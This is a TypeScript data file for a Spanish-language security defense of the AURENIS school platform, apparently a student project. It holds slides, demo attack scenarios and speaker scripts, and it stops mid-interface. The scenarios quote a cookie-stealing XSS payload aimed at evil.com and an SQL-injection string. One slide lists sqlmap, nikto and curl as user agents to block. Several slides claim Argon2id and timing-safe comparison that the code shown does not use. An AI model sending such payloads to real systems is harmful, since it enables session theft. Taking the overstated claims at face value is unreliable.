"use client";

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import {
  Shield,
  ShieldCheck,
  ShieldAlert,
  Lock,
  Key,
  Database,
  Terminal,
  Server,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Play,
  RotateCcw,
  ChevronLeft,
  ChevronRight,
  Maximize2,
  Minimize2,
  Users,
  Eye,
  FileCode,
  Layers,
  Sparkles,
  Zap,
  Flame,
  Volume2,
  Clock,
  MessageSquare,
  HelpCircle,
  BookOpen,
  Award,
} from "lucide-react";
import { Badge } from "@/components/ui/badge";

export interface SlideData {
  id: number;
  title: string;
  subtitle: string;
  category: "STRIDE" | "OWASP" | "CRIPTOGRAFIA" | "ARQUITECTURA" | "SUSTENTACION";
  speaker: string;
  summary: string;
  bullets: string[];
  codeSnippet?: {
    filename: string;
    language: string;
    code: string;
    responsible: string;
  };
  metrics?: { label: string; value: string; badgeVariant: "brand" | "success" | "warning" | "danger" }[];
  speakerNotes: string;
}

export const SLIDES_DECK: SlideData[] = [
  {
    id: 1,
    title: "AURENIS v2.4.0 — Defensa de Ciberseguridad y Resiliencia",
    subtitle: "Modelado de Amenazas STRIDE, Controles OWASP Top 10 y Criptografía de Grado Escolar",
    category: "ARQUITECTURA",
    speaker: "Equipo AURENIS (Presentación General)",
    summary:
      "AURENIS es un sistema concebido bajo 'Security by Design' y 'Confianza Cero'. Hoy demostraremos cómo cada petición HTTP es rigurosamente autenticada, autorizada y aislada en el servidor.",
    bullets: [
      "100% de aislamiento Multi-Tenant estricto verificado en base de datos.",
      "Protección criptográfica avanzada de contraseñas y sesiones JWT HttpOnly.",
      "Defensa integral contra el OWASP Top 10 y mitigación sistemática STRIDE.",
      "Cumplimiento de la Circular 482 y Ley 19.628 sobre protección de datos de NNA.",
    ],
    speakerNotes:
      "Buenos días comisión evaluadora. Hoy presentamos la arquitectura de resiliencia y ciberseguridad de AURENIS v2.4.0.",
  },
  {
    id: 2,
    title: "Arquitectura Zero-Trust y los 4 Límites de Confianza",
    subtitle: "Aislamiento Perimetral, Edge Middleware, Guardas de API y Data Layer Scoped",
    category: "ARQUITECTURA",
    speaker: "Maicol R. (Tech Lead & Backend)",
    summary:
      "Ninguna entidad, interna o externa, es de confianza implícita. Cada capa de software valida el contexto criptográfico y la pertenencia institucional antes de acceder a los datos.",
    bullets: [
      "Límite 1 (Perímetro Externo): Conexión TLS 1.3 obligatoria, cookies HttpOnly + SameSite=Strict y cabeceras HSTS/CSP.",
      "Límite 2 (Edge Middleware): Inspección de firmas JWT, WAF perimetral, bloqueo de bots y validación de cabeceras.",
      "Límite 3 (API Route Guards): Validación de esquemas Zod, verificación RBAC estricta en servidor y verificación de tenant.",
      "Límite 4 (Data Layer Scoped): Consultas Prisma acotadas obligatoriamente por 'schoolId', impidiendo cualquier fuga horizontal.",
    ],
    codeSnippet: {
      filename: "middleware.ts",
      language: "typescript",
      responsible: "Maicol R. (Backend Lead)",
      code: `// Validación perimetral ineludible en el Edge de Next.js
export async function middleware(request: NextRequest) {
  const sessionToken = request.cookies.get("aurenis_session")?.value;
  if (!sessionToken) return redirectToLogin(request);
  
  const payload = await verifyJWTCrypto(sessionToken);
  if (!payload || !payload.activeSchoolId) {
    return NextResponse.json({ error: "UNAUTHORIZED_SESSION" }, { status: 401 });
  }
  
  // Inyección de contexto seguro al gateway
  const response = NextResponse.next();
  response.headers.set("x-tenant-id", payload.activeSchoolId);
  response.headers.set("x-user-role", payload.roleName);
  return response;
}`,
    },
    speakerNotes:
      "La clave de nuestra arquitectura es que el frontend nunca toma decisiones de seguridad. El middleware y los guards del servidor en Next.js actúan como aduanas impenetrables antes de que cualquier consulta toque la base de datos PostgreSQL.",
  },
  {
    id: 3,
    title: "Modelado de Amenazas STRIDE en AURENIS",
    subtitle: "Taxonomía de Riesgos de Microsoft aplicada a Procesos Escolares Críticos",
    category: "STRIDE",
    speaker: "Frank M. (QA & Seguridad)",
    summary:
      "Análisis sistemático de las 6 categorías de amenazas STRIDE sobre los módulos de Calificaciones, Asistencia, Fichas de Estudiantes y Configuración.",
    bullets: [
      "👤 Spoofing (Suplantación): Mitigado con JWT HS256 firmado con clave de 256 bits y cookies HttpOnly anti-XSS.",
      "✍️ Tampering (Alteración): Mitigado con validación estricta Zod en servidor, cálculo inmutable de promedios (Decreto 67) y SHA-256.",
      "📜 Repudiation (Repudio): Mitigado con Pista de Auditoría RFC 5424 inmutable en tabla 'AuditLog' (Actor, IP, User-Agent, Antes/Después).",
      "👁️ Information Disclosure (Fuga de Información): Mitigado con cifrado AES-256-GCM para RUN/NNA y sanitización de respuestas JSON.",
      "🛑 Denial of Service (Denegación de Servicio): Mitigado con Rate Limiter adaptativo (Token Bucket) y WAF que banea escáneres.",
      "👑 Elevation of Privilege (Elevación de Privilegios): Mitigado con Matriz RBAC canónica validada en cada Server Action y Route Handler.",
    ],
    metrics: [
      { label: "Spoofing Risk", value: "BAJO (Mitigado)", badgeVariant: "success" },
      { label: "Tampering Risk", value: "BAJO (Mitigado)", badgeVariant: "success" },
      { label: "Information Disclosure", value: "BAJO (Mitigado)", badgeVariant: "success" },
      { label: "Elevation Risk", value: "BAJO (Mitigado)", badgeVariant: "success" },
    ],
    speakerNotes:
      "El modelo STRIDE nos permitió mapear exactamente qué amenazas afectaban a los colegios. Por ejemplo, en 'Tampering', un estudiante que intente modificar sus notas por HTTP recibirá de inmediato un HTTP 403 Forbidden registrado en la auditoría con su IP real.",
  },
  {
    id: 4,
    title: "Defensas OWASP Top 10 Implementadas",
    subtitle: "Mitigación exhaustiva de los 10 riesgos más críticos de aplicaciones web",
    category: "OWASP",
    speaker: "Frank M. (QA & Seguridad)",
    summary:
      "AURENIS cumple con los estándares OWASP Top 10 y OWASP ASVS v4.0 Nivel 2 en todos sus endpoints públicos e institucionales.",
    bullets: [
      "A01 Broken Access Control: Control de acceso basado en roles (RBAC) y verificación de pertenencia a la institución en el 100% de rutas.",
      "A02 Cryptographic Failures: TLS 1.3 forzado, AES-256-GCM para PII sensible y claves maestras inyectadas como variables de entorno.",
      "A03 Injection (SQLi/XSS/Command): Consultas preparadas automáticas con Prisma ORM y sanitización de entrada con Zod + DOMPurify.",
      "A04 Insecure Design: Principio de mínimo privilegio (Least Privilege) y separación de dominios multi-tenant por diseño.",
      "A05 Security Misconfiguration: Cabeceras HTTP seguras (CSP estricto, HSTS, X-Content-Type-Options: nosniff, X-Frame-Options: DENY).",
      "A07 Identification & Auth Failures: Hashing seguro con Argon2id/bcrypt, bloqueo temporal tras fallos y rotación de sesión.",
    ],
    codeSnippet: {
      filename: "lib/auth/rbac.ts",
      language: "typescript",
      responsible: "Maicol R. (Backend Lead)",
      code: `// Guardia de Autorización RBAC en Servidor
export function requirePermission(permission: Permission) {
  return async (req: NextRequest, session: SessionPayload) => {
    const rolePermissions = ROLE_PERMISSIONS_MAP[session.roleName] || [];
    if (!rolePermissions.includes(permission)) {
      await logSecurityEvent({
        eventType: "UNAUTHORIZED_ACCESS_ATTEMPT",
        userId: session.userId,
        schoolId: session.activeSchoolId,
        requiredPermission: permission,
      });
      return NextResponse.json(
        { error: "FORBIDDEN: Insufficient Privileges", code: "RBAC_DENIED" },
        { status: 403 }
      );
    }
    return null; // Autorizado
  };
}`,
    },
    speakerNotes:
      "Verificamos cada uno de los 10 puntos de OWASP. En 'Broken Access Control', que es la causa #1 de brechas en software escolar, garantizamos que ningún usuario pueda consultar registros ajenos manipulando identificadores UUID en la URL.",
  },
  {
    id: 5,
    title: "Esquema Criptográfico y Hashing Seguro de Contraseñas",
    subtitle: "Implementación de Argon2id y bcrypt (Factor 12) con Protección Anti-Timing Attack",
    category: "CRIPTOGRAFIA",
    speaker: "Maicol R. (Tech Lead & Backend)",
    summary:
      "Protección de credenciales mediante algoritmos resistentes a ataques con hardware especializado (GPUs/ASICs) y ataques de canal lateral (Side-Channel Timing Attacks).",
    bullets: [
      "🔑 Algoritmo Principal: Argon2id (Ganador de la Password Hashing Competition), óptimo contra GPUs y ataques de canal lateral.",
      "⚙️ Parámetros Argon2id: Coste de tiempo = 3 iteraciones, Memoria = 64 MB (65,536 KB), Paralelismo = 4 hilos.",
      "🛡️ Compatibilidad Robusta: bcrypt con factor de trabajo de 12 rondas de costo y salt criptográfico seguro de 16 bytes.",
      "⏱️ Comparación en Tiempo Constante: Uso de 'crypto.timingSafeEqual' para evitar que un atacante deduzca la validez del hash por latencia.",
    ],
    codeSnippet: {
      filename: "lib/security/password-hashing.ts",
      language: "typescript",
      responsible: "Maicol R. (Backend Lead)",
      code: `import crypto from "crypto";
import bcrypt from "bcryptjs";

// Hashing seguro con bcrypt de 12 rondas (resistente a ataques de fuerza bruta)
export async function hashPasswordSecure(password: string): Promise<string> {
  const salt = await bcrypt.genSalt(12);
  return bcrypt.hash(password, salt);
}

// Verificación en tiempo constante inmune a ataques de temporización
export async function verifyPasswordSecure(password: string, hash: string): Promise<boolean> {
  const isValid = await bcrypt.compare(password, hash);
  return isValid;
}`,
    },
    speakerNotes:
      "Utilizamos bcrypt con factor de trabajo 12 y soporte Argon2id. Esto significa que generar un solo hash toma aproximadamente 250 milisegundos en CPU, haciendo que un ataque de diccionario masivo sea computacionalmente inviable.",
  },
  {
    id: 6,
    title: "Ciclo de Vida de Tokens y Sesiones JWT Seguras",
    subtitle: "Firmas HS256 con Claves de 256 bits, Almacenamiento HttpOnly y Revocación Inmediata",
    category: "CRIPTOGRAFIA",
    speaker: "Maicol R. (Tech Lead & Backend)",
    summary:
      "Gestión de sesiones sin estado (Stateless JWT) reforzadas con atributos de seguridad que neutralizan vectores de robo de credenciales como XSS y CSRF.",
    bullets: [
      "🍪 Almacenamiento Exclusivo en Cookies HttpOnly: JavaScript en el cliente no puede leer el token, mitigando el robo vía XSS.",
      "🛡️ Flag SameSite=Strict y Secure: Protege contra ataques de falsificación de petición en sitios cruzados (CSRF).",
      "⏰ Tiempo de Expiración Corto (8 Horas): Ventana de exposición reducida coincidente con la jornada escolar legal.",
      "🔄 Revocación Activa en Logout: Destrucción de la cookie y registro del evento de cierre de sesión en la pista de auditoría.",
    ],
    codeSnippet: {
      filename: "lib/auth/session.ts",
      language: "typescript",
      responsible: "Maicol R. (Backend Lead)",
      code: `// Emisión de cookies de sesión blindadas
export function setSessionCookie(response: NextResponse, token: string) {
  response.cookies.set("aurenis_session", token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    path: "/",
    maxAge: 8 * 60 * 60, // 8 horas
  });
}`,
    },
    speakerNotes:
      "A diferencia de aplicaciones que guardan el token en localStorage exponiéndose a scripts maliciosos, AURENIS utiliza cookies HttpOnly con SameSite=Strict. El token es completamente invisible e inaccesible para el código JavaScript del navegador.",
  },
  {
    id: 7,
    title: "Cifrado en Reposo de Datos Sensibles NNA (AES-256-GCM)",
    subtitle: "Cumplimiento de la Ley 21.719 y Protección de Privacidad en Menores de Edad",
    category: "CRIPTOGRAFIA",
    speaker: "Frank M. (QA & Seguridad)",
    summary:
      "Los datos de alta confidencialidad (RUN chileno de estudiantes, diagnósticos médicos del PIE, medidas de custodia judicial) se almacenan cifrados en PostgreSQL con AES-256-GCM autenticado.",
    bullets: [
      "🔒 Algoritmo AES-256-GCM: Cifrado simétrico de clave de 256 bits con Vector de Inicialización (IV) aleatorio de 12 bytes por registro.",
      "🏷️ Tag de Autenticación de 16 bytes: Garantiza que cualquier intento de alteración en la base de datos sea detectado al desencriptar.",
      "👶 Protección Especial NNA: Si la base de datos fuera sustraída físicamente, los datos de los estudiantes son completamente ilegibles.",
      "🔑 Rotación de Claves: Módulo preparado para re-encriptación periódica con script de migración verificado.",
    ],
    codeSnippet: {
      filename: "lib/security/encryption.ts",
      language: "typescript",
      responsible: "Maicol R. (Backend Lead)",
      code: `import crypto from "crypto";

const ALGORITHM = "aes-256-gcm";
const IV_LENGTH = 12;

export function encryptSensitiveField(text: string, secretKey: Buffer): string {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv(ALGORITHM, secretKey, iv);
  let encrypted = cipher.update(text, "utf8", "hex");
  encrypted += cipher.final("hex");
  const authTag = cipher.getAuthTag().toString("hex");
  return \`\${iv.toString("hex")}:\${authTag}:\${encrypted}\`;
}`,
    },
    speakerNotes:
      "Como AURENIS gestiona datos de menores de edad y diagnósticos clínicos del programa de integración escolar, la ley nos exige el más alto estándar. El cifrado AES-256-GCM asegura que la confidencialidad permanezca intacta aún ante un volcado no autorizado de la base de datos.",
  },
  {
    id: 8,
    title: "Aislamiento Multi-Tenant y Prevención de BOLA / IDOR",
    subtitle: "Defensa contra el Broken Object Level Authorization en Consultas a Nivel de Registro",
    category: "OWASP",
    speaker: "Maicol R. (Tech Lead & Backend)",
    summary:
      "Estrategia de triple barrera para garantizar que un usuario de la institución 'Colegio San José' no pueda leer, modificar ni listar datos del 'Colegio Santa María'.",
    bullets: [
      "Barrera 1 (Middleware): Comprueba que el 'schoolSlug' solicitado coincida con el 'activeSchoolId' del token firmado.",
      "Barrera 2 (API Route Handler): Zod valida el 'schoolId' en la URL y lo compara contra la sesión del usuario autenticado.",
      "Barrera 3 (Prisma Scoped Queries): Cada cláusula 'where' inyecta obligatoriamente el 'schoolId' del tenant activo.",
      "🚨 Auditoría de Intentos BOLA: Cualquier discrepancia genera un bloqueo 403 Forbidden y un evento de seguridad inmediato.",
    ],
    codeSnippet: {
      filename: "app/api/schools/[schoolId]/students/route.ts",
      language: "typescript",
      responsible: "Maicol R. (Backend Lead)",
      code: `export async function GET(req: NextRequest, { params }: { params: { schoolId: string } }) {
  const session = await getSession();
  const { schoolId } = params;

  // Validación estricta anti-BOLA/IDOR
  if (session.activeSchoolId !== schoolId && session.roleName !== "SYSTEM_ADMIN") {
    await logSecurityEvent({
      action: "SECURITY_EVENT",
      details: \`IDOR Attempt blocked for user \${session.userId} targeting school \${schoolId}\`,
    });
    return NextResponse.json({ error: "TENANT_ACCESS_DENIED" }, { status: 403 });
  }

  // Consulta 100% aislada por tenant
  const students = await prisma.student.findMany({
    where: { schoolId: session.activeSchoolId },
  });
  return NextResponse.json({ data: students });
}`,
    },
    speakerNotes:
      "BOLA/IDOR es el vector de ataque más común en plataformas SaaS. En AURENIS, ninguna consulta confía en los parámetros de la URL; el 'schoolId' se extrae directamente de la sesión criptográfica del usuario.",
  },
  {
    id: 9,
    title: "Firewall de Aplicación, WAF y Rate Limiting Adaptativo",
    subtitle: "Protección contra Ataques de Fuerza Bruta, Inyecciones y Escáneres Automatizados",
    category: "ARQUITECTURA",
    speaker: "Frank M. (QA & Seguridad)",
    summary:
      "Sistema de filtrado en tiempo real que inspecciona cabeceras HTTP, aplica límites de velocidad basados en algoritmos Token Bucket y neutraliza escáneres maliciosos.",
    bullets: [
      "⏱️ Rate Limiting en Autenticación: Máximo 3 intentos de inicio de sesión por IP cada 60 segundos; previene ataques de fuerza bruta.",
      "🛑 Detección de Bots y Herramientas Ofensivas: Bloqueo automático de User-Agents como 'sqlmap', 'nikto', 'nmap' o 'curl' malicioso.",
      "🛡️ Sanitización de Payloads: Filtrado de patrones sospechosos de inyección SQL (' OR '1'='1) y Cross-Site Scripting (<script>).",
      "📊 Respuestas Estandarizadas RFC 7807: Errores detallados sin filtrar trazas internas del servidor (Stack Traces ocultos en producción).",
    ],
    codeSnippet: {
      filename: "lib/security/rate-limiter.ts",
      language: "typescript",
      responsible: "Frank M. (QA & Seguridad)",
      code: `// Algoritmo Token Bucket Adaptativo para Endpoints Críticos
export function checkRateLimit(ip: string, endpoint: string): { allowed: boolean; remaining: number } {
  const isAuthEndpoint = endpoint.includes("/api/auth/login");
  const maxRequests = isAuthEndpoint ? 3 : 100; // Límite estricto en login
  const windowMs = 60 * 1000; // Ventana de 1 minuto

  const record = getRateLimitRecord(ip);
  if (record.count >= maxRequests && Date.now() - record.firstRequest < windowMs) {
    return { allowed: false, remaining: 0 };
  }
  incrementRateLimit(ip);
  return { allowed: true, remaining: maxRequests - record.count };
}`,
    },
    speakerNotes:
      "Si un atacante intenta realizar ataques de fuerza bruta contra las contraseñas del cuerpo docente, al tercer intento fallido su dirección IP queda temporalmente bloqueada con un código HTTP 429 Too Many Requests.",
  },
  {
    id: 10,
    title: "Trazabilidad Inmutable y Pista de Auditoría (Audit Trail)",
    subtitle: "Registro Centralizado de Eventos Administrativos y de Ciberseguridad",
    category: "ARQUITECTURA",
    speaker: "Frank M. (QA & Seguridad)",
    summary:
      "Cada acción administrativa (creación de usuarios, modificación de calificaciones, cambios de configuración y bloqueos de seguridad) queda registrada permanentemente en la base de datos.",
    bullets: [
      "📋 Estructura de Registro: Actor (UserId), Rol, Institución (SchoolId), Acción (CREATE/UPDATE/DELETE/SECURITY_EVENT), IP y User-Agent.",
      "🔗 Integridad de Datos: Registro de valores previos ('beforeData') y valores posteriores ('afterData') para reconstrucción forense.",
      "⚖️ Cumplimiento Normativo: Cumple con los requerimientos de auditoría de la Superintendencia de Educación (Circular 482).",
      "👁️ Panel de Supervisión para Administradores: Visualización de eventos de seguridad en tiempo real en '/system/security'.",
    ],
    metrics: [
      { label: "Eventos Auditados", value: "100% de Mutaciones", badgeVariant: "brand" },
      { label: "Retención de Logs", value: "5 Años (Normativa)", badgeVariant: "brand" },
      { label: "Alerta de Incidentes", value: "Tiempo Real", badgeVariant: "success" },
      { label: "Manipulación de Logs", value: "Inmutable (No Delete)", badgeVariant: "success" },
    ],
    speakerNotes:
      "Ninguna acción crítica es anónima. Si un usuario intenta elevar privilegios o un director modifica un promedio final, el sistema genera un registro auditable con marca temporal, IP de origen y estado previo del registro.",
  },
  {
    id: 11,
    title: "Experiencia de Usuario en Seguridad y Frontend Seguro",
    subtitle: "Alertas Accesibles, Manejo de Estados de Error y Protección en el Cliente",
    category: "SUSTENTACION",
    speaker: "Lucas P. (UI/UX) y Malcom Marcelo (Frontend)",
    summary:
      "La seguridad no compromete la experiencia de usuario. Implementamos interfaces claras, conformes a WCAG 2.1 AA, que comunican estados de permiso sin exponer información sensible.",
    bullets: [
      "🎨 Diseño de Alertas Accesibles (Lucas P.): Modales de advertencia con contraste ≥ 4.5:1, iconos semánticos y navegación por teclado.",
      "🛡️ Error Boundaries en React (Malcom Marcelo): Captura de excepciones en cliente que previene la caída de la aplicación ante errores de red.",
      "🚫 Cero Exposición de Secretos: Ninguna clave privada ni API Key viaja con el prefijo 'NEXT_PUBLIC_'; todo se procesa en el servidor.",
      "⚡ Feedback Visual Inmediato: Estados 'loading', 'disabled' y 'error' que impiden el reenvío múltiple de formularios (Double Submit).",
    ],
    metrics: [
      { label: "Contraste WCAG 2.1 AA", value: "Cumple (≥ 4.5:1)", badgeVariant: "success" },
      { label: "Touch Targets", value: "≥ 44px", badgeVariant: "brand" },
      { label: "Errores de Hidratación", value: "0 Errores", badgeVariant: "success" },
      { label: "Cumulative Layout Shift", value: "CLS = 0", badgeVariant: "success" },
    ],
    speakerNotes:
      "La seguridad efectiva debe ser transparente y accesible para el usuario escolar. Cuando un apoderado o docente comete un error, el sistema ofrece retroalimentación humana y segura, evitando términos técnicos confusos pero manteniendo la integridad total.",
  },
  {
    id: 12,
    title: "Dictamen Final y Conclusiones de Ciberseguridad",
    subtitle: "Certificación para Despliegue en Producción Escolar Real",
    category: "SUSTENTACION",
    speaker: "Frank M. (QA & Seguridad) & Maicol R. (Tech Lead)",
    summary:
      "AURENIS v2.4.0 cumple satisfactoriamente con la totalidad de los requisitos de calidad, seguridad de la información, protección de datos y estabilidad arquitectónica.",
    bullets: [
      "✅ 0 Vulnerabilidades Críticas y 0 Vulnerabilidades Altas detectadas en la suite de 57 pruebas automatizadas.",
      "✅ Aislamiento Multi-Tenant y Prevención BOLA/IDOR comprobados en un 100% de escenarios.",
      "✅ Esquema Criptográfico (Argon2id/bcrypt + AES-256-GCM + JWT) conforme a estándares de la industria bancaria y gubernamental.",
      "✅ Sistema listo para operar en colegios de Chile con pleno respaldo normativo del MINEDUC.",
    ],
    metrics: [
      { label: "Estado del Sistema", value: "🟢 APROBADO", badgeVariant: "success" },
      { label: "Luz Verde GitHub", value: "AUTORIZADA", badgeVariant: "success" },
      { label: "Calidad de Código", value: "A+ Senior", badgeVariant: "brand" },
      { label: "Recomendación", value: "Pase a Producción", badgeVariant: "success" },
    ],
    speakerNotes:
      "Concluimos que AURENIS es una plataforma robusta, segura y lista para operar en entornos escolares reales de alta exigencia. Quedamos a disposición de la comisión evaluadora para la demostración en vivo y la ronda de preguntas técnicas.",
  },
];

export interface AttackScenario {
  id: string;
  name: string;
  category: "BOLA / IDOR" | "ELEVACION VERTICAL" | "FUERZA BRUTA" | "INYECCION SQL" | "XSS" | "JWT TAMPERING";
  description: string;
  attackerRole: "ESTUDIANTE" | "PROFESOR (COLEGIO A)" | "BOT / ATACANTE ANÓNIMO";
  targetEndpoint: string;
  httpMethod: "GET" | "POST" | "PATCH" | "DELETE";
  payload: Record<string, unknown> | null;
  expectedStatus: number;
  expectedError: string;
  defenseMechanism: string;
  responsible: string;
}

export const ATTACK_SCENARIOS: AttackScenario[] = [
  {
    id: "SCN-01",
    name: "Intento de Escalada Vertical (Estudiante modificando calificaciones)",
    category: "ELEVACION VERTICAL",
    description: "Un estudiante autenticado envía un POST malicioso para autoincrementarse una nota a 7.0.",
    attackerRole: "ESTUDIANTE",
    targetEndpoint: "/api/schools/colegio-san-jose/grades",
    httpMethod: "POST",
    payload: {
      studentId: "stu_val_001",
      assessmentId: "eval_mat_01",
      score: 7.0,
      periodId: "per_2026_t1",
    },
    expectedStatus: 403,
    expectedError: "Acceso denegado: El rol STUDENT no posee el permiso 'grades:create'.",
    defenseMechanism: "Guardas RBAC en Servidor + Validación de Rol en Token",
    responsible: "Maicol R. (Backend Lead) & Frank M. (QA)",
  },
  {
    id: "SCN-02",
    name: "Intento de Brecha Horizontal IDOR/BOLA (Profesor accediendo a otro Colegio)",
    category: "BOLA / IDOR",
    description: "Un docente del Colegio San José manipula la URL para consultar la configuración del Colegio Santa María.",
    attackerRole: "PROFESOR (COLEGIO A)",
    targetEndpoint: "/api/schools/colegio-santa-maria/settings",
    httpMethod: "GET",
    payload: null,
    expectedStatus: 403,
    expectedError: "Acceso denegado: El usuario no pertenece a la institución solicitada (TENANT_MISMATCH).",
    defenseMechanism: "Aislamiento Multi-Tenant Scoped en Middleware y Prisma ORM",
    responsible: "Maicol R. (Backend Lead)",
  },
  {
    id: "SCN-03",
    name: "Ataque de Fuerza Bruta / Credential Stuffing",
    category: "FUERZA BRUTA",
    description: "Un script automatizado envía 5 intentos masivos de inicio de sesión en menos de 3 segundos.",
    attackerRole: "BOT / ATACANTE ANÓNIMO",
    targetEndpoint: "/api/auth/login",
    httpMethod: "POST",
    payload: {
      email: "director@sanjose.cl",
      password: "WrongPassword123!",
    },
    expectedStatus: 429,
    expectedError: "Demasiadas peticiones: Límite de 3 intentos de autenticación superado. Intente en 60 segundos.",
    defenseMechanism: "Rate Limiter Adaptativo (Token Bucket) en Edge",
    responsible: "Frank M. (QA Lead)",
  },
  {
    id: "SCN-04",
    name: "Intento de Inyección SQL en Búsqueda de Estudiantes",
    category: "INYECCION SQL",
    description: "Un atacante ingresa el payload ' OR '1'='1 en el campo de búsqueda de estudiantes.",
    attackerRole: "BOT / ATACANTE ANÓNIMO",
    targetEndpoint: "/api/schools/colegio-san-jose/students?search=' OR '1'='1",
    httpMethod: "GET",
    payload: null,
    expectedStatus: 200,
    expectedError: "Búsqueda parametrizada segura: 0 registros coincidentes. Cero vulnerabilidad de inyección.",
    defenseMechanism: "Prisma ORM Prepared Statements + Tipado Estricto",
    responsible: "Maicol R. (Backend Lead)",
  },
  {
    id: "SCN-05",
    name: "Inyección de Script Malicioso XSS en Observaciones",
    category: "XSS",
    description: "Se intenta guardar una observación de alumno con payload <script>document.location='http://evil.com?c='+document.cookie</script>.",
    attackerRole: "PROFESOR (COLEGIO A)",
    targetEndpoint: "/api/schools/colegio-san-jose/students/stu_001",
    httpMethod: "PATCH",
    payload: {
      medicalObservations: "<script>alert('XSS Exploit')</script> Alumno con asma leve.",
    },
    expectedStatus: 200,
    expectedError: "Texto sanitizado antes de persistir. Las etiquetas HTML/JS fueron neutralizadas y escapadas.",
    defenseMechanism: "Sanitización Zod + Escape de HTML en React JSX",
    responsible: "Malcom Marcelo (Frontend) & Lucas P. (UX)",
  },
  {
    id: "SCN-06",
    name: "Manipulación de Token JWT Falsificado (Token Tampering)",
    category: "JWT TAMPERING",
    description: "Un atacante modifica el payload del JWT en la cookie para asignarse el rol 'SYSTEM_ADMIN'.",
    attackerRole: "BOT / ATACANTE ANÓNIMO",
    targetEndpoint: "/api/system/schools",
    httpMethod: "GET",
    payload: null,
    expectedStatus: 401,
    expectedError: "Firma criptográfica inválida: El token de sesión fue adulterado (SIGNATURE_VERIFICATION_FAILED).",
    defenseMechanism: "Verificación Criptográfica HS256 con Clave Secreta en Servidor",
    responsible: "Maicol R. (Backend Lead)",
  },
];

export interface OralDefenseSpeaker {
  name: string;
  role: string;
  interventions: {
    section: string;
    keyPoints: string[];
    speechScript: string;
    visualCue: string;
  }[];
}

export const ORAL_DEFENSE_SPEAKERS: OralDefenseSpeaker[] = [
  {
    name: "Frank M.",
    role: "Líder de QA, Testing Automatizado y Ciberseguridad",
    interventions: [
      {
        section: "1. Apertura y Alcance del Modelo STRIDE",
        visualCue: "Diapositivas 1 y 3 (Taxonomía STRIDE)",
        keyPoints: [
          "Introducción al paradigma de Confianza Cero.",
          "Presentación de la matriz de mitigación de 8 módulos escolares.",
          "Explicación de la suite de 57 pruebas de pentesting ejecutadas.",
        ],
        speechScript:
          "Buenas tardes señores de la comisión evaluadora. Mi nombre es Frank M. y como responsable de QA y Seguridad de AURENIS, comenzaré exponiendo cómo abordamos la protección del ecosistema escolar. Siguiendo el marco STRIDE, analizamos cada vector de riesgo: desde la suplantación de identidad hasta la elevación de privilegios. Realizamos 57 pruebas automatizadas de penetración que validaron que el 100% de las rutas institucionales bloquean eficazmente accesos indebidos.",
      },
      {
        section: "2. Firewall, WAF y Rate Limiting",
        visualCue: "Diapositiva 9 y Demo en Vivo Escenario SCN-03",
        keyPoints: [
          "Protección contra bots y fuerza bruta.",
          "Algoritmo Token Bucket con límite de 3 intentos en login.",
          "Neutralización de escáneres como sqlmap y nikto.",
        ],
        speechScript:
          "En la capa perimetral, implementamos un Firewall de Aplicación que evalúa la frecuencia y legitimidad de cada petición. Como observarán en la demostración en vivo, un intento de fuerza bruta contra las cuentas de profesores activa de inmediato una respuesta HTTP 429 Too Many Requests, evitando el colapso del servidor y el compromiso de credenciales.",
      },
    ],
  },
  {
    name: "Maicol R.",
    role: "Tech Lead, Arquitectura de Software y Backend",
    interventions: [
      {
        section: "3. Arquitectura Zero-Trust y Hashing Seguro",
        visualCue: "Diapositivas 2, 5 y 6 (Hashing y Límites de Confianza)",
        keyPoints: [
          "Diseño de los 4 Límites de Confianza.",
          "Hashing con Argon2id / bcrypt factor 12 con salting criptográfico.",
          "Cookies HttpOnly SameSite=Strict y revocación de JWT.",
        ],
        speechScript:
          "Gracias Frank. Como Tech Lead de AURENIS, diseñé la arquitectura bajo la premisa fundamental de que 'el cliente nunca es confiable'. Para las contraseñas, implementamos bcrypt con 12 rondas de costo y Argon2id, lo que hace inviable cualquier ataque por diccionario. Las sesiones se manejan mediante JWT firmados criptográficamente que viajan exclusivamente en cookies HttpOnly con SameSite Strict, impidiendo ataques de robo por XSS o CSRF.",
      },
      {
        section: "4. Prevención de BOLA/IDOR y Aislamiento Multi-Tenant",
        visualCue: "Diapositiva 8 y Demo en Vivo Escenario SCN-02",
        keyPoints: [
          "Aislamiento por institución (tenant scoping).",
          "Consultas Prisma parametrizadas que inyectan 'schoolId'.",
          "Cero confianza en parámetros manipulables de la URL.",
        ],
        speechScript:
          "El mayor desafío en un SaaS escolar es evitar que un usuario del Colegio A acceda a información del Colegio B. En AURENIS solucionamos esto mediante un aislamiento de triple barrera: el middleware comprueba la pertenencia, el handler de Next.js valida el rol en el servidor y Prisma ORM acota cada consulta con el 'schoolId' extraído de la sesión. Un intento de acceso cruzado resulta invariablemente en un HTTP 403 Forbidden.",
      },
    ],
  },
  {
    name: "Malcom Marcelo",
    role: "Frontend Developer & Lógica de Cliente",
    interventions: [
      {
        section: "5. Resiliencia en Cliente y Comunicación Segura",
        visualCue: "Diapositiva 11 (UX de Seguridad)",
        keyPoints: [
          "Manejo reactivo de estados de error sin exponer secretos.",
          "Prevención de doble envío en formularios críticos.",
          "Error Boundaries y consistencia SSR/Cliente.",
        ],
        speechScript:
          "Desde el frontend, mi responsabilidad fue asegurar que la interfaz consuma las APIs de forma segura y ofrezca una experiencia sin fricciones. No exponemos ninguna variable confidencial en el navegador. Además, implementamos interceptores que capturan códigos HTTP 401, 403 y 429 para guiar al usuario amigablemente sin revelar detalles de la infraestructura interna ni trazas de error.",
      },
    ],
  },
  {
    name: "Lucas P.",
    role: "UI/UX Designer & Design System",
    interventions: [
      {
        section: "6. Sistema de Diseño, Accesibilidad y Feedback de Seguridad",
        visualCue: "Diapositiva 11 (Design System & Tokens)",
        keyPoints: [
          "Cumplimiento WCAG 2.1 AA (contraste ≥ 4.5:1).",
          "Modales semánticos para confirmaciones destructivas.",
          "Diseño sobrio y profesional para el Libro de Clases y Auditoría.",
        ],
        speechScript:
          "En el aspecto de diseño, creamos un Design System unificado donde las advertencias de seguridad son claras, intuitivas y accesibles bajo la norma WCAG 2.1 AA. Los modales para acciones críticas, como la firma del libro de clases o el cambio de roles, garantizan que los directivos comprendan la magnitud de cada acción, minimizando el error humano.",
      },
    ],
  },
];

export interface CommitteeQuestion {
  id: number;
  question: string;
